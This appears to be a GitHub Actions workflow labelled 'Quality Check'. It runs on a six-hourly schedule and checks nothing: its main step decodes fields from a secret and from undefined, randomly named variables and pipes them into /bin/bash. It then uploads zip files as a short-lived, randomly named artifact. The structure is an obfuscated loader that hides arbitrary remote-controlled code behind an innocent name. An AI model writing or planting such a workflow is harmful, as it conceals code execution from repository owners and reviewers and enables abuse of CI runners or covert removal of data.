name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '55 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          a4: ${{ secrets.a4 }}
        run: |
          printf '%s' "$a4" | jq -r .n673 | /bin/bash
          printf '%s' "$lh7" | jq -r .wph93269 | /bin/bash
          echo $vzyv86470 | jq -r .ke269 | /bin/bash
          echo $qve72 | jq -r .epw49909 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: sKTxdusV
          path: "*.zip"
          retention-days: 1
